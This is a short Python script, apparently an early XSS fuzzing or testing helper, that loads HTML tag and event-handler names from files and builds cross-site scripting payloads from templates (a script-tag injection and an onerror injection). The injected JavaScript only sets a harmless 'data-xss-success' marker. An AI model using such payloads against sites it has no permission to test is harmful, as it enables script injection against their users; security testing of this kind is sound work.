import random

def load_list_from_file(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

HTML_TAGS = load_list_from_file('tags.txt')
EVENT_LISTENERS = load_list_from_file('events.txt')

def generate_basic_payload(tag='script'):
    js_code = "document.body.setAttribute('data-xss-success','true')"
    payloads = [
        f'<{tag}>{js_code}</{tag}>',
        f'<{tag} src=x onerror="{js_code}"></{tag}>',
    ]
    return random.choice(payloads)


if __name__ == '__main__':
    if not HTML_TAGS or not EVENT_LISTENERS:
        print("Could not run example because tags.txt or events.txt are empty or not found.")
    else:
        print("--- Loaded Tags ---")
        print(HTML_TAGS)
        print("\n--- Loaded Event Listeners ---")
        print(EVENT_LISTENERS)